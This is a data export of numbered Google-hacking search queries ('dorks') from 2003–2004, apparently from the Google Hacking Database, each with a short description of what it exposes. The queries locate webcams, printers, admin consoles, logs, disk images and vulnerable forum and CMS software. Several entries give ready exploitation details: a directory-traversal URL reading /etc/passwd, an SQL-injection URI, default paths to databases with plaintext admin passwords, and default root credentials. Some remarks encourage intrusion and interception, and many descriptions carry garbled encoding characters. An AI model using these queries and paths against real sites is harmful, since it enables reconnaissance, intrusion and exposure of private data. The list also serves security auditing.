&quot;1&quot;;&quot;2003-06-24&quot;;&quot;"cacheserverreport for" "This analysis was produced by calamaris"&quot;;&quot;These are squid server cache reports. Fairly benign, really except when you consider using them for evil purposes. For example, an institution stands up a proxy server for their internal users to get to the outside world. Then, the internal user surf all over to their hearts content (including intranet pages cuz well, the admins are stupid) Voila, intranet links show up in the external cache report. Want to make matters worse for yourself as an admin? OK, configure your external proxy server as a trusted internal host. Load up your web browser, set your proxy as their proxy and surf your way into their intranet. Not that I&#039;ve noticed any examples of this in this google list. *COUGH* *COUGH* *COUGH*  unresolved DNS lookups give clues *COUGH* *COUGH* (&#039;scuse me. must be a furball) OK, lets say BEST CASE scenario. Let&#039;s say there&#039;s not security problems revealed in these logs. Best case scenario is that outsiders can see what your company/agency/workers are surfing.&quot;
&quot;686&quot;;&quot;2004-11-18&quot;;&quot;filetype:myd myd -CVS&quot;;&quot;MySQL stores its data for each database in individual files with the extension MYD.An attacker can copy these files to his machine and using a tool like &#039;strings&#039; possibly view the contents of the database.&quot;
&quot;687&quot;;&quot;2004-11-18&quot;;&quot;"Obtenez votre forum Aztek" -site:forum-aztek.com&quot;;&quot;Atztek Forum is a french forum system. Aztek Forum is reported prone to multiple input validation vulnerabilities. These issues may allow an attacker to carry out cross-site scripting and possibly other attacks.http://www.securityfocus.com/bid/11654&quot;
&quot;688&quot;;&quot;2004-11-18&quot;;&quot;intext:("UBB.threadsÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ 6.2"|"UBB.threadsÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ 6.3") intext:"You * not logged *" -site:ubbcentral.com&quot;;&quot;UBB.Threads 6.2.*-6.3.* one char bruteforce vulnerability:http://www.k-otik.com/exploits/20041116.r57ubb.pl.php&quot;
&quot;689&quot;;&quot;2004-11-18&quot;;&quot;inurl:/SiteChassisManager/&quot;;&quot;Unknown SQL injection and XSS vulnerabilities in DMXReady Site Chassis Manager.http://www.securityfocus.com/bid/11434/discussion/&quot;
&quot;690&quot;;&quot;2004-11-18&quot;;&quot;"Powered by Land Down Under 601"&quot;;&quot;sQL injection vulnerability in Land Down Under 601 could give an attacker administrative access. An exploit exists on the internet, search google.&quot;
&quot;691&quot;;&quot;2004-11-18&quot;;&quot;intitle:"EvoCam" inurl:"webcam.html"&quot;;&quot;Evocams !&quot;
&quot;692&quot;;&quot;2004-11-18&quot;;&quot;inurl:directorypro.cgi&quot;;&quot;A security vulnerability in the product allows attackers to perform a directory traversal attack and access files that reside outside the normal HTTP root directory.http://target/cgi-bin/directorypro.cgi?want=showcat&show=../../../../etc/passwd%00http://www.securityfocus.com/bid/2793&quot;
&quot;693&quot;;&quot;2004-11-18&quot;;&quot;intitle:"PhpMyExplorer" inurl:"index.php" -cvs&quot;;&quot;PhpMyExplorer is a PHP application that allows you to easily update your site online without any FTP access. A security vulnerability in the product allows attackers to view and read files that reside outside the normal bound directory.&quot;
&quot;694&quot;;&quot;2004-11-18&quot;;&quot;inurl:cal_make.pl&quot;;&quot;A security vulnerability in PerlCal allows remote attackers to access files that reside outside the normally bounding HTML root directory. http://www.securityfocus.com/bid/2663&quot;
&quot;695&quot;;&quot;2004-11-18&quot;;&quot;inurl:/webedit.* intext:WebEdit Professional -html&quot;;&quot;WebEdit is a content management system. This is the login portal search.&quot;
&quot;696&quot;;&quot;2004-11-21&quot;;&quot;intitle:"Apache::Status" (inurl:server-status | inurl:status.html | inurl:apache.html)&quot;;&quot;The Apache::Status returns information about the server software, operating system, number of child processes and current visitors. The official documentation can be found at hxxp://search.cpan.org/~gozer/mod_perl-1.29/lib/Apache/Status.pm&quot;
&quot;697&quot;;&quot;2004-11-18&quot;;&quot;"Powered by PowerPortal v1.3"&quot;;&quot;PowerPortal is reported vulnerable to remote SQL injection. This issue is due to a failure of the application to properly validate user-supplied input prior to including it in an SQL query. PowerPortal 1.3 is reported prone to this vulnerability, however, it is possible that other versions are affected as well. An example URI sufficient to exploit this vulnerability has been provided: http://www.example.com/pp13/index.php?index_page=and 1=1http://www.securityfocus.com/bid/11681&quot;
&quot;698&quot;;&quot;2004-11-23&quot;;&quot;"Microsoft (R) Windows * (TM) Version * DrWtsn32 Copyright (C)" ext:log&quot;;&quot;This file spills a lot of juicy info... in some cases, passwords in the raw dump, but not in any I&#039;ve found this time around. However, with a computer name, a user name, and various other nuggets of info, this one file seems to sketch the system pretty well.&quot;
&quot;699&quot;;&quot;2004-11-20&quot;;&quot;inurl:report "EVEREST Home Edition "&quot;;&quot;Well what can be said about this one, I&#039;ve added it to the DB under Juicy info, however it could have easilly gone under virtually any of the lists as it just give out Soooo much info. I can for instance find out the admin username (not just the adin every user) and also if it password protected and if the password ever expires plus is it a current user account, also do the same for any guest accounts, Ok nice and easy how about the O/S and all the Mapped Drive locations all there along with installed software and even currently running applications and processes. Site admins would have to be mad to leave this stuff open, but as we all know from the GHDB Site admins do weird and funny stuff. This one just gives out to much to list, so go have a look and see what you can find.&quot;
&quot;700&quot;;&quot;2004-11-19&quot;;&quot;"powered by minibb" -site:www.minibb.net -intext:1.7f&quot;;&quot;miniBB is reported vulnerable to remote SQL injection. This issue is due to a failure of the application to properly validate user-supplied input prior to including it in an SQL query. miniBB versions prior to 1.7f are reported prone to this issue.http://www.securityfocus.com/bid/11688&quot;
&quot;701&quot;;&quot;2004-11-23&quot;;&quot;"powered by ducalendar" -site:duware.com&quot;;&quot;Most duware products use Microsoft Access databases in default locations without instructing the users to change them. The plain text admin passwords are just a click away for any attacker who knows how to type an URL. For Ducalendar it&#039;s: /ducalendar/_private/ducalendar.mdb&quot;
&quot;702&quot;;&quot;2004-11-23&quot;;&quot;"Powered by Duclassified" -site:duware.com&quot;;&quot;Most duware products use Microsoft Access databases in default locations without instructing the users to change them. The plain text admin passwords are just a click away for any attacker who knows how to type an URL. For Duclassified it&#039;s: /duclassified/_private/duclassified.mdb&quot;
&quot;703&quot;;&quot;2004-11-23&quot;;&quot;"Powered by Dudirectory" -site:duware.com&quot;;&quot;Most duware products use Microsoft Access databases in default locations without instructing the users to change them. The plain text admin passwords are just a click away for any attacker who knows how to type an URL. For DuDirectory it&#039;s: /dudirectory/_private/dudirectory.mdb&quot;
&quot;704&quot;;&quot;2004-11-23&quot;;&quot;"Powered by Duclassified" -site:duware.com "DUware All Rights reserved"&quot;;&quot;Most duware products use Microsoft Access databases in default locations without instructing the users to change them. The plain text admin passwords are just a click away for any attacker who knows how to type an URL. For Duclassified it&#039;s: /duclassified/_private/duclassified.mdb&quot;
&quot;705&quot;;&quot;2004-11-23&quot;;&quot;"powered by duclassmate" -site:duware.com&quot;;&quot;Most duware products use Microsoft Access databases in default locations without instructing the users to change them. The plain text admin passwords are just a click away for any attacker who knows how to type an URL. For Duclassmate it&#039;s: /duclassmate/_private/duclassmate.mdb&quot;
&quot;706&quot;;&quot;2004-11-23&quot;;&quot;intitle:dupics inurl:(add.asp | default.asp | view.asp | voting.asp) -site:duware.com&quot;;&quot;Most duware products use Microsoft Access databases in default locations without instructing the users to change them. The plain text admin passwords are just a click away for any attacker who knows how to type an URL. For Dupics rename location to ../_private/dupics.mdb&quot;
&quot;707&quot;;&quot;2004-11-23&quot;;&quot;"powered by dudownload" -site:duware.com&quot;;&quot;Most duware products use Microsoft Access databases in default locations without instructing the users to change them. The plain text admin passwords are just a click away for any attacker who knows how to type an URL. rename ../xxx to ../_private/dudownload.mdb&quot;
&quot;708&quot;;&quot;2004-11-23&quot;;&quot;intitle:"ipcop - main"&quot;;&quot;IPCop Firewall is a Linux firewall for home and SOHO users. IPCop can be managed from a simple web interface (which can be found and managed by Google Hackers ;)&quot;
&quot;709&quot;;&quot;2004-11-24&quot;;&quot;intitle:"Smoothwall Express" inurl:cgi-bin "up * days"&quot;;&quot;smoothwall is a firewall operating system distribution based on Linux. (Not many results for this search at the moment).&quot;
&quot;710&quot;;&quot;2004-11-28&quot;;&quot;filetype:php HAXPLORER "Server Files Browser"&quot;;&quot;Haxplorer is a webbased filemanager which enables the user to browse files on the webserver. You can rename, delete, copy, download and upload files. As the script&#039;s name says it is mostly installed by hackers&quot;
&quot;711&quot;;&quot;2004-11-28&quot;;&quot;inurl:coranto.cgi intitle:Login (Authorized Users Only)&quot;;&quot;Coranto is one of the most powerful Content Management System (CMS) available on the market. It is a freeware product written in Perl and it can help the development and streamlining of your site(s). It is written to be a multiuser environment for posting news articles on a web site, it supports multiple browsers, multiple operating systems, produces standard compliant html, has a huge variety of excellent features and is fully extendible via addons. It is free for use on any site, personal or commercial!&quot;
&quot;712&quot;;&quot;2004-11-28&quot;;&quot;filetype:log intext:"ConnectionManager2"&quot;;&quot;ISDNPM 3.x for OS/2-Dialer log files.These files contain sensitive info like ip addresses, phone numbers of dial in servers, usernames and password hashes - Everything you need to dial in....&quot;
&quot;713&quot;;&quot;2004-11-28&quot;;&quot;intext:"Videoconference Management System" ext:htm&quot;;&quot;Tandberg video conferencing appliancesThe webinterface enables you to drop calls and to browse the internal phonebook&quot;
&quot;714&quot;;&quot;2004-11-28&quot;;&quot;ext:txt "Final encryption key"&quot;;&quot;IPSec debug/log data which contains user data and password hashes.Can be used to crack passwords.&quot;
&quot;715&quot;;&quot;2004-11-28&quot;;&quot;filetype:log "See `ipsec --copyright"&quot;;&quot;BARF log filesMan page:Barf outputs (on standard output) a collection of debugging information (contents of files, selections from logs, etc.) related to the IPSEC encryption/authentication system. It is primarily a convenience for remote debugging, a single command which packages up (and labels) all information that might be relevant to diagnosing a problem in IPSEC.&quot;
&quot;716&quot;;&quot;2004-11-28&quot;;&quot;intitle:"Welcome To Xitami" -site:xitami.com&quot;;&quot;Default Xitami installationAdditionally every default installation of Xitami webserver has a testscript which provides a lot of information about the server.It can be run by entering the following urlhttp://server/cgialias/testcgi.exe(cgialias = is usually /cgi-bin/)&quot;
&quot;717&quot;;&quot;2004-11-28&quot;;&quot;inurl:testcgi xitami&quot;;&quot;Testpage / webserver environmentThis is the test cgi for xitami webserver. It shows the webserver&#039;s complete environment. Contains very interesting information which can be used a first step into the server.&quot;
&quot;718&quot;;&quot;2004-11-28&quot;;&quot;intitle:"DocuShare" inurl:"docushare/dsweb/" -faq&quot;;&quot;some companies use a Xerox Product called DocuShare. The problem with this is by default guest access is enabled and it appears a lot of companies either don&#039;t care or don&#039;t know.&quot;
&quot;719&quot;;&quot;2004-11-28&quot;;&quot;intext:"Powered By: TotalIndex" intitle:"TotalIndex"&quot;;&quot;TotalIndex v2.0 is an open source script that is designed to replace the simple, and boring default index page of a site which lists the files in an indexed folder. It&#039;s not PW protected so an attacker can browse the files and take what they want.&quot;
&quot;720&quot;;&quot;2004-11-28&quot;;&quot;inurl:"GRC.DAT" intext:"password"&quot;;&quot;symantec Norton Anti-Virus Corporate Edition data file containing encrypted passwords.&quot;
&quot;721&quot;;&quot;2004-11-28&quot;;&quot;inurl:php.exe filetype:exe -example.com&quot;;&quot;It is possible to read any file remotely on the server with PHP.EXE (assuming a script alias for it is enabled), even across drives. (Note: The GHDB has another search for this file based on directorly listings, try them both)&quot;
&quot;722&quot;;&quot;2004-11-28&quot;;&quot;intitle:"PHP Advanced Transfer" inurl:"login.php"&quot;;&quot;PHP Advacaned Transfer is GPL&#039;d software that claims to be the "The ultimate PHP download & upload manager". This is a search for the login pages.&quot;
&quot;723&quot;;&quot;2004-11-28&quot;;&quot;intitle:"PHP Advanced Transfer" (inurl:index.php | inurl:showrecent.php )&quot;;&quot;PHP Advacaned Transfer is GPL&#039;d software that claims to be the "The ultimate PHP download & upload manager". This is a search for the main and recently changed files pages.&quot;
&quot;724&quot;;&quot;2004-11-28&quot;;&quot;"Output produced by SysWatch *"&quot;;&quot;sysWatch is a CGI to display current information about your UNIX system. It can display drive partitions, disk or drive usage, as well as resource hogs (running processes) and last but not lease it shows what current users are doing online (including sh scripts etc..).&quot;
&quot;725&quot;;&quot;2004-11-28&quot;;&quot;PHPKonsole PHPShell filetype:php -echo&quot;;&quot;PHPKonsole is just a little telnet like shell wich allows you to run commands on the webserver. When you run commands they will run as the webservers UserID. This should work perfectly for managing files, like moving, copying etc. If you&#039;re using a linux server, system commands such as ls, mv and cp will be available for you...&quot;
&quot;726&quot;;&quot;2004-11-28&quot;;&quot;"Phorum Admin" "Database Connection" inurl:forum inurl:admin&quot;;&quot;Phorum admin pagesThis either shows Information leakage (path info) or it shows Unprotected Admin pages.&quot;
&quot;727&quot;;&quot;2004-11-28&quot;;&quot;"Warning: mysql_query()" "invalid query"&quot;;&quot;MySQL query errors revealing database schema and usernames.&quot;
&quot;728&quot;;&quot;2004-11-29&quot;;&quot;inurl:"/cgi-bin/loadpage.cgi?user_id="&quot;;&quot;Description:EZshopper is a full-featured shopping cart program. loadpage.cgi of EZshopper allows Directory Traversal http://www.securityfocus.com/bid/2109&quot;
&quot;729&quot;;&quot;2004-11-30&quot;;&quot;inurl:"ipp/pdisplay.htm"&quot;;&quot;Providing a standout printing solution, Novell iPrint offers secure print services that extend across multiple networks and operating systemsÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã‚Âbringing the power of the Net to your business environment. This search locates various online printers.&quot;
&quot;730&quot;;&quot;2004-11-30&quot;;&quot;filetype:mdb inurl:"news/news"&quot;;&quot;Web Wiz Site News unprotected database holds config and admin information in a microsoft access database in news/news.mdb. This information is almost always unprotected.&quot;
&quot;731&quot;;&quot;2004-11-30&quot;;&quot;intitle:"View Img" inurl:viewimg.php&quot;;&quot;It is reported that the &#039;viewing.php&#039; script does not properly validate user-supplied input in the &#039;path&#039; variable. A remote user can submit a specially crafted URL to view a list of files within an arbitrary directory. See http://securitytracker.com/alerts/2004/Nov/1012312.html  for more information.&quot;
&quot;732&quot;;&quot;2004-11-30&quot;;&quot;intitle:"Resin Default Home Page"&quot;;&quot;Resin provides a fast standalone web server. This search locates those servers based on the title of the default page.&quot;
&quot;733&quot;;&quot;2004-11-30&quot;;&quot;intext:"Storage Management Server for" intitle:"Server Administration"&quot;;&quot;These pages can reveal information about the operating system and patch level, as well as providing a login portal for hackers to attack. "As part of the IBM TotalStorageÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â® Open Software Family, IBM Tivoli Storage (ADSM) Manager protects your organization&#039;s data from hardware failures and other errors by storing backup and archive copies of data on offline storage."&quot;
&quot;734&quot;;&quot;2004-12-01&quot;;&quot;filetype:pl -intext:"/usr/bin/perl" inurl:webcal (inurl:webcal | inurl:add | inurl:delete | inurl:config)&quot;;&quot;WebCal allows you to create and maintain an interactive events calendar or scheduling system on your Web site. The file names explain themselves, but don&#039;t abuse the faulty admins.&quot;
&quot;735&quot;;&quot;2004-11-25&quot;;&quot;site:ups.com intitle:"Ups Package tracking" intext:"1Z ### ### ## #### ### #"&quot;;&quot;Ever use the UPS Automated Tracking Service?? Wanna see where packages are going? Want to Man-in-the-middle their delivery? Well, then here it is.-Digital Spirit&quot;
&quot;736&quot;;&quot;2004-12-02&quot;;&quot;intitle:"twiki" inurl:"TWikiUsers"&quot;;&quot;TWiki has many security problems, depeding on the version installed. TWiki, is a flexible, powerful, and easy to use enterprise collaboration platform. It is a structured Wiki, typically used to run a project development space, a document management system, a knowledge base, or any other groupware tool, on an intranet or on the internet. Web content can be created collaboratively by using just a browser. Developers can create new web applications based on a Plugin API.&quot;
&quot;737&quot;;&quot;2004-12-01&quot;;&quot;+"Powered by Invision Power Board v2.0.0..2"&quot;;&quot;A remote SQL injection vulnerability affects Inivision Power Board. This issue is due to a failure of the application to properly validate user-supplied input prior to using it in an SQL query.http://www.securityfocus.com/bid/11719&quot;
&quot;738&quot;;&quot;2004-12-03&quot;;&quot;ext:gho gho&quot;;&quot;Norton Ghost allows administrators to create hard rive images for lots of purposes including backup, migration, etc. These files contain the hard drive images which can be restored to create an exact duplicate of a hard drive, which could contain just about anything!&quot;
&quot;739&quot;;&quot;2004-12-03&quot;;&quot;ext:pqi pqi -database&quot;;&quot;PQ DriveImage allows administrators to create hard rive images for lots of purposes including backup, migration, etc. These files contain the hard drive images which can be restored to create an exact duplicate of a hard drive, which could contain just about anything!&quot;
&quot;740&quot;;&quot;2004-12-03&quot;;&quot;ext:vmdk vmdk&quot;;&quot;VMWare allows PC emulation across a variety of platforms. These files are VMWare disk images which essentially contain a copy of an entire PC, which could contain almost anything.&quot;
&quot;741&quot;;&quot;2004-12-03&quot;;&quot;ext:vmx vmx&quot;;&quot;VMWare allows PC emulation across a variety of platforms. Theseconfiguration files describe a virtual PC, and reveal information about that PC&#039;s hardware settings.&quot;
&quot;742&quot;;&quot;2004-12-02&quot;;&quot;inurl:filezilla.xml -cvs&quot;;&quot;filezilla.xml contains Sites,Logins and crypted Passwords of ftp connections made with the open source programm filezilla.&quot;
&quot;743&quot;;&quot;2004-12-01&quot;;&quot;+"Powered by phpBB 2.0.6..10" -phpbb.com -phpbb.pl&quot;;&quot;phpbb is vulnerable to SQL Injection, allowing people to minipulate the query into pulling data (such as passwords). Arbituary EXEC allows an attacker (if they get on to a new line), to execute their own PHP, which can be fatal.&quot;
&quot;744&quot;;&quot;2004-12-03&quot;;&quot;"Copyright (c) Tektronix, Inc." "printer status"&quot;;&quot;Captain, the Phasers are online :)&quot;
&quot;745&quot;;&quot;2004-12-03&quot;;&quot;intext:"MaiLinX Alert (Notify)" -site:networkprinters.com&quot;;&quot;Xerox DocuPrint printer models.&quot;
&quot;746&quot;;&quot;2004-12-03&quot;;&quot;inurl:"printer/main.html" intext:"settings"&quot;;&quot;Brother HL Printers.&quot;
&quot;747&quot;;&quot;2004-12-03&quot;;&quot;inurl:"sitescope.html" intitle:"sitescope" intext:"refresh" -demo&quot;;&quot;Mercury SiteScope designed to ensure the availability and performance of distributed IT infrastructures ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â e.g., servers, operating systems, network devices, network services, applications, and components. Some pages may be IP restricted.&quot;
&quot;748&quot;;&quot;2004-12-04&quot;;&quot;axis storpoint "file view" inurl:/volumes/&quot;;&quot;The Axis Storpoint device turns a SCSI or ATA box with lots of cdrom players (or writers) into a cd tower which can be browsed through any browser. The default admin password combo = root/pass. CD access can be password restricted like in Apache. Axis uses it&#039;s own server software. Many vulnerabilities can be found in the security databases like SF.&quot;
&quot;749&quot;;&quot;2004-12-04&quot;;&quot;inurl:"/axs/ax-admin.pl" -script&quot;;&quot;This system records visits to your site. This admin script allows you to display these records in meaningful graph and database formats.&quot;
&quot;750&quot;;&quot;2004-12-05&quot;;&quot;"Generated by phpSystem"&quot;;&quot;PhpSystem shows info about unix systems, including: General Info (kernel, cpu, uptime), Connections, Who Is Logged In, Memory, Swap and active mounts.&quot;
&quot;751&quot;;&quot;2004-12-05&quot;;&quot;php-addressbook  "This is the addressbook for *" -warning&quot;;&quot;php-addressbook shows user address information without a password.&quot;
&quot;752&quot;;&quot;2004-12-04&quot;;&quot;intitle:"Multimon UPS status page"&quot;;&quot;Multimon provide UPS monitoring services&quot;
&quot;753&quot;;&quot;2004-12-04&quot;;&quot;intitle:"Mail Server CMailServer Webmail" "5.2"&quot;;&quot;CMailServer is a small mail webmail server. Multiple vulnerabilities were found, including buffer overflow, SQL Injection and XXS.http://www.securiteam.com/windowsntfocus/6E00M2KBPS.html&quot;
&quot;754&quot;;&quot;2004-12-05&quot;;&quot;intitle:"index of" "parent directory" "desktop.ini" site:dyndns.org&quot;;&quot;This search uses desktop.ini to track users with a webserver running on their desktop computers. It can easily be extended to find specific documents.&quot;
&quot;755&quot;;&quot;2004-12-06&quot;;&quot;intitle:"Live NetSnap Cam-Server feed"&quot;;&quot;Netsnap Online Cameras&quot;
&quot;756&quot;;&quot;2004-12-06&quot;;&quot;intitle:"V-Gear BEE"&quot;;&quot;V-Gear Bee Web Cameras&quot;
&quot;757&quot;;&quot;2004-12-06&quot;;&quot;intitle:"AudioReQuest.web.server"&quot;;&quot;Audio ReQuest home CD/MP3 player. Various information about the configuration of the host and surrounding network can be found out by visiting the main page of this server. Beyond that, you could peruse someones MP3 collection!&quot;
&quot;758&quot;;&quot;2004-12-07&quot;;&quot;filetype:php inurl:ipinfo.php "Distributed Intrusion Detection System"&quot;;&quot;Dshield is a distributed intrusion detection system. The ipinfo.php script includes a whois lookup form.&quot;
&quot;759&quot;;&quot;2004-12-06&quot;;&quot;ext:cfg radius.cfg&quot;;&quot;"Radiator is a highly configurable and flexible Radius server that supports authentication by nearly 60 different types of authentication methods"This search finds configuration files for this server, revealing its behaviour, methods for authenticating users, etc.&quot;
&quot;760&quot;;&quot;2004-12-07&quot;;&quot;intitle:"VitalQIP IP Management System"&quot;;&quot;The VitalQIP Web Client Interface provides a World Wide Web interface for the VitalQIP IP Management software. The purpose of the VitalQIP Web Client Interface is to allow users to add, modify, and delete IP addresses; create configuration and data files; and generate reports. It is not a fully functional user interface, such as the VitalQIP Windows or VitalQIP UNIX Clients. Certain options, such as infrastructure or policy management, are not provided. The VitalQIP Web Client Interface software is based on HTML and Perl, so your organization can customize it to meet your requirements. Vendors site: http://www.lucent.com/products/solution/0,,CTID+2020-STID+10438-SOID+1456-LOCL+1,00.html&quot;
&quot;761&quot;;&quot;2004-12-13&quot;;&quot;intext:"powered by Web Wiz Journal"&quot;;&quot;Web Wiz Journal ASP Blog. The MDB database is mostly unprotected and can be downloaded directly. The DB contains administrative acccountsfilename: journal.mdbadmin login: admin.html&quot;
&quot;762&quot;;&quot;2004-12-13&quot;;&quot;intitle:"vhost" intext:"vHost . 2000-2004"&quot;;&quot;vHost is a one-step solution for all virtual hosting needs. It enables a Linux/BSD server with single or multiple IP addresses to function as unlimited virtual hosts with HTTP, FTP, SMTP, POP3, IMAP, and other virtual services extentable via modules. It comes with both command-line and web-based graphical user interfaces, which give maximum control to a domain&#039;s owner, while relieving the system administrator of most routine administration tasks.&quot;
&quot;763&quot;;&quot;2004-12-10&quot;;&quot;intitle:"start.managing.the.device" remote pbx acc&quot;;&quot;MCK Communications, Inc.PBXgatewayIIHigh density central site gateway for remote PBX access(MCK Communications is now known as VESO.)&quot;
&quot;764&quot;;&quot;2004-12-13&quot;;&quot;allintext:"Powered by LionMax Software" "WWW File Share"&quot;;&quot;WWW File Share Pro is a small HTTP server that can help you share files with your friends. They can download files from your computer or upload files from theirs. Simply specify a directory for downloads and a directory for uploads. All servers can be accessed anonymously&quot;
&quot;765&quot;;&quot;2004-12-13&quot;;&quot;inurl:":631/printers" -php -demo&quot;;&quot;CUPS provides a portable printing layer for UNIXÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â®-based operating systems. It has been developed by Easy Software Products to promote a standard printing solution for all UNIX vendors and users. CUPS provides the System V and Berkeley command-line interfaces. CUPS uses the Internet Printing Protocol ("IPP") as the basis for managing print jobs and queues. The Line Printer Daemon ("LPD") Server Message Block ("SMB"), and AppSocket (a.k.a. JetDirect).&quot;
&quot;766&quot;;&quot;2004-12-13&quot;;&quot;ext:dat bpk.dat&quot;;&quot;Perfect Keylogger is as the name says a keylogger :)This dork finds the corresponding datafiles which can be read with the free downloadable lite version.&quot;
&quot;767&quot;;&quot;2004-12-13&quot;;&quot;intitle:"iVISTA.Main.Page"&quot;;&quot;And again another webcam search. MOst of these cams seem to be security cams&quot;
&quot;768&quot;;&quot;2004-12-13&quot;;&quot;inurl:2506/jana-admin&quot;;&quot;The JanaServer 2 is amongst other things a proxy server, that makes it possible for LAN members, everyone or a group as a part of the LAN, to access the internet via a Modem, ISDN or DSL connection. For this the program must be installed on the computer, that can access the internet by an installed modem, ISDN or a DSL adapter.&quot;
&quot;769&quot;;&quot;2004-12-13&quot;;&quot;intitle:"Spam Firewall" inurl:"8000/cgi-bin/index.cgi"&quot;;&quot;The Barracuda Spam Firewall is an integrated hardware and software solution for complete protection of your email server. It provides a powerful, easy to use, and affordable solution to eliminating spam and virus from your organization.&quot;
&quot;770&quot;;&quot;2004-12-13&quot;;&quot;inurl:ds.py&quot;;&quot;Affordable Web-based document and content management application lets businesses of every size rapidly deploy a world-class Enterprise Content Management (ECM) solution to help reduce costs, optimize information flow, and reduce risk&quot;
&quot;771&quot;;&quot;2004-12-10&quot;;&quot;inurl:"1220/parse_xml.cgi?"&quot;;&quot;Quicktime streaming server is uhhhhh.....well it&#039;s a streaming server and it can be managed via http. No need to say more. Darwin Streaming Server is the opensource version (for *NUX os&#039;s).Some are pass protected, others not.&quot;
&quot;772&quot;;&quot;2004-12-19&quot;;&quot;intitle:"MX Control Console" "If you can&#039;t remember"&quot;;&quot;MX LogicÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢s customizable and easy-to-use MX Control ConsoleSM is a centralized email threat management policy platform that provides you with one interface for managing all corporate-wide email threats, protection and security. With the MX Control Console, you can easily configure and control your email protection and security based on your overall corporate email policies.&quot;
&quot;773&quot;;&quot;2004-12-07&quot;;&quot;intext:"Welcome to the Web V.Networks" intitle:"V.Networks [Top]" -filetype:htm&quot;;&quot;see and control JVC webcameras, you can move the camera, zoom... change the settings, etc....&quot;
&quot;774&quot;;&quot;2004-12-19&quot;;&quot;intitle:"WebLogic Server" intitle:"Console Login" inurl:console&quot;;&quot;BEA WebLogic Server 8.1 provides an industrial-strength application infrastructure for developing, integrating, securing, and managing distributed service-oriented applications. By simplifying and unifying the enterprise infrastructure, IT organizations can now deliver greater value in less time, at reduced cost to the overall business.&quot;
&quot;775&quot;;&quot;2004-12-19&quot;;&quot;ext:conf inurl:rsyncd.conf -cvs -man&quot;;&quot;rsync is an open source utility that provides fast incremental file transfer.rsync can also talk to "rsync servers" which can provide anonymous or authenticated rsync.The configuration files contain data about peers and paths&quot;
&quot;776&quot;;&quot;2004-12-19&quot;;&quot;inurl:"phpOracleAdmin/php" -download -cvs&quot;;&quot;phpOracleAdmin is intended to be a webbased Oracle Object Manager.In many points alike phpMyAdmin, it should offer more comfort and possibilities. Interestingly these managers are not password protected.&quot;
&quot;777&quot;;&quot;2004-12-19&quot;;&quot;inurl:1810 "Oracle Enterprise Manager"&quot;;&quot;Enterprise Manager 10g Grid Control provides a single tool that can monitor and manage not only every Oracle software element in your grid, but also Web applications, hosts, and the network in between. Grid Control is also extensible via an SDK so customers can use it to monitor additional components that are not supported out-of-the box.&quot;
&quot;778&quot;;&quot;2004-12-19&quot;;&quot;"Powered by Invision Power File Manager" (inurl:login.php) | (intitle:"Browsing directory /" )&quot;;&quot;Invision Power File Manager is a popular file management script, written in the popular PHP Scripting Language. It is compatiable with all forms of Unix and Windows and allows the user to control their files via any modern browser.&quot;
&quot;779&quot;;&quot;2004-12-19&quot;;&quot;intitle:"Novell Web Services" intext:"Select a service and a language."&quot;;&quot;"NovellÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â® GroupWise is an enterprise collaboration system that provides secure e-mail, calendaring, scheduling, and instant messaging. GroupWise also includes task management, contact management, document management, and other productivity tools. GroupWise can be used on your desktop on Linux, Windows*, or Macintosh; in a Web browser anywhere you have an Internet connection; and even on wireless devices. Your GroupWise system can be set up on NetWareÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â®, Linux, Windows, or any combination of these operating systems."&quot;
